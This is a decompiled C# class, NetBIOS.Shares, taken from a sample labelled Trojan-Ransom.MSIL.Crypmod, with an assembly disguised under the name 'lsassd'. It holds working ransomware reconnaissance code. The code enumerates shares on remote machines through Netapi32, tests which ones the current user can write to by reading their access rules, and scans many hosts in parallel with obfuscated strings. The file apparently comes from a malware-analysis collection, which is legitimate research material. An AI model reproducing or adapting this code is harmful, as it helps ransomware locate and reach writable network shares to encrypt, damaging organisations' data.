// Decompiled with JetBrains decompiler
// Type: NetBIOS.Shares
// Assembly: lsassd, Version=3.4.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 432C6617-1CB7-4116-A49C-FF7B0B5EE7E5
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-b3ebc327773f5f846deeb1255475644a630c4d0d3b4eda3bbf995a36599c07cf.exe

using \u003CPrivateImplementationDetails\u003E\u007B18A11B1C\u002D3AA7\u002D4357\u002DAAD9\u002DCC83BB5216E3\u007D;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace NetBIOS
{
  public class Shares
  {
    private const uint A = 4294967295;
    private const int A = 0;
    public static ReaderWriterLockSlim _readWriteLock = new ReaderWriterLockSlim();

    [DllImport("Netapi32.dll", SetLastError = true)]
    public static extern int NetWkstaGetInfo(string servername, int level, out IntPtr bufptr);

    [DllImport("Netapi32.dll", EntryPoint = "NetApiBufferFree", SetLastError = true)]
    private static extern int A([In] IntPtr obj0);

    [DllImport("Netapi32.dll", EntryPoint = "NetShareEnum", CharSet = CharSet.Unicode)]
    private static extern int A(
      [In] StringBuilder obj0,
      [In] int obj1,
      [In] ref IntPtr obj2,
      [In] uint obj3,
      [In] ref int obj4,
      [In] ref int obj5,
      [In] ref int obj6);

    public static Shares.SHARE_INFO_1[] EnumNetShares(string Server)
    {
      List<Shares.SHARE_INFO_1> shareInfo1List = new List<Shares.SHARE_INFO_1>();
      int num1 = 0;
      int num2 = 0;
      int num3 = 0;
      int num4 = Marshal.SizeOf(typeof (Shares.SHARE_INFO_1));
      IntPtr zero = IntPtr.Zero;
      int num5 = Shares.A(new StringBuilder(Server), 1, ref zero, uint.MaxValue, ref num1, ref num2, ref num3);
      if (num5 == 0)
      {
        IntPtr ptr = zero;
        for (int index = 0; index < num1; ++index)
        {
          Shares.SHARE_INFO_1 structure = (Shares.SHARE_INFO_1) Marshal.PtrToStructure(ptr, typeof (Shares.SHARE_INFO_1));
          shareInfo1List.Add(structure);
          ptr += num4;
        }
        Shares.A(zero);
        return shareInfo1List.ToArray();
      }
      shareInfo1List.Add(new Shares.SHARE_INFO_1(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.A() + num5.ToString(), 10U, string.Empty));
      return shareInfo1List.ToArray();
    }

    public static List<string> GetComputerShares(string computer, bool check)
    {
      List<string> computerShares = new List<string>();
      List<string> stringList = new List<string>();
      stringList.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.a());
      stringList.Add(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.B());
      if (computer != null && computer.Trim().Length > 0)
      {
        Shares.SHARE_INFO_1[] shareInfo1Array = Shares.EnumNetShares(computer);
        if (check)
        {
          List<string> collection = Shares.a(computer, stringList, shareInfo1Array);
          if (collection.Count > 0)
            computerShares.AddRange((IEnumerable<string>) collection);
        }
        foreach (string str in Shares.A(computer, stringList, shareInfo1Array))
        {
          if (!computerShares.Contains(str))
            computerShares.Add(str);
        }
      }
      return computerShares;
    }

    private static List<string> A([In] string obj0, [In] List<string> obj1, [In] Shares.SHARE_INFO_1[] obj2)
    {
      List<string> stringList = new List<string>();
      foreach (Shares.SHARE_INFO_1 shareInfo1 in obj2)
      {
        if (!obj1.Contains(shareInfo1.shi1_netname))
        {
          try
          {
            string path = string.Format(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.b(), (object) obj0, (object) shareInfo1.shi1_netname);
            Directory.GetFiles(path);
            stringList.Add(path);
          }
          catch (Exception ex)
          {
          }
        }
      }
      return stringList;
    }

    private static List<string> a([In] string obj0, [In] List<string> obj1, [In] Shares.SHARE_INFO_1[] obj2)
    {
      List<string> stringList = new List<string>();
      WindowsIdentity current = WindowsIdentity.GetCurrent();
      string str = current.User.Value;
      foreach (Shares.SHARE_INFO_1 shareInfo1 in obj2)
      {
        if (!obj1.Contains(shareInfo1.shi1_netname))
        {
          try
          {
            string path = string.Format(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.b(), (object) obj0, (object) shareInfo1.shi1_netname);
            Directory.GetFiles(path);
            foreach (FileSystemAccessRule accessRule in (ReadOnlyCollectionBase) Directory.GetAccessControl(path).GetAccessRules(true, true, typeof (SecurityIdentifier)))
            {
              if ((accessRule.IdentityReference.ToString() == str || current.Groups.Contains(accessRule.IdentityReference)) && accessRule.FileSystemRights.HasFlag((Enum) FileSystemRights.Write) && accessRule.AccessControlType == AccessControlType.Allow)
              {
                stringList.Add(shareInfo1.shi1_netname);
                break;
              }
            }
          }
          catch
          {
          }
        }
      }
      return stringList;
    }

    public static void WriteToFileThreadSafe(string text, string path)
    {
      Shares._readWriteLock.EnterWriteLock();
      try
      {
        using (StreamWriter streamWriter = File.AppendText(path))
        {
          streamWriter.WriteLine(text);
          streamWriter.Close();
        }
      }
      finally
      {
        Shares._readWriteLock.ExitWriteLock();
      }
    }

    public static void GetAllShares(List<string> computers, List<string> accumulator)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Shares.c c = new Shares.c();
      // ISSUE: reference to a compiler-generated field
      c.A = accumulator;
      List<Action> actionList = new List<Action>();
      foreach (string computer in computers)
      {
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: reference to a compiler-generated method
        actionList.Add(new Action(new Shares.D()
        {
          A = c,
          A = computer
        }.A));
      }
      Parallel.Invoke(new ParallelOptions()
      {
        MaxDegreeOfParallelism = Environment.ProcessorCount * 2
      }, actionList.ToArray());
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct WKSTA_INFO_100
    {
      public int platform_id;
      public string computer_name;
      public string lan_group;
      public int ver_major;
      public int ver_minor;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct SHARE_INFO_0
    {
      public string shi0_netname;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct SHARE_INFO_1
    {
      public string shi1_netname;
      public uint shi1_type;
      public string shi1_remark;

      public SHARE_INFO_1(string sharename, uint sharetype, string remark)
      {
        this.shi1_netname = sharename;
        this.shi1_type = sharetype;
        this.shi1_remark = remark;
      }

      public override string ToString() => this.shi1_netname;
    }

    private enum b : uint
    {
      A = 0,
      a = 2100, // 0x00000834
      B = 2116, // 0x00000844
      b = 2118, // 0x00000846
      C = 2123, // 0x0000084B
    }

    private enum C : uint
    {
      A = 0,
      a = 1,
      B = 2,
      b = 3,
      C = 2147483648, // 0x80000000
    }
  }
}
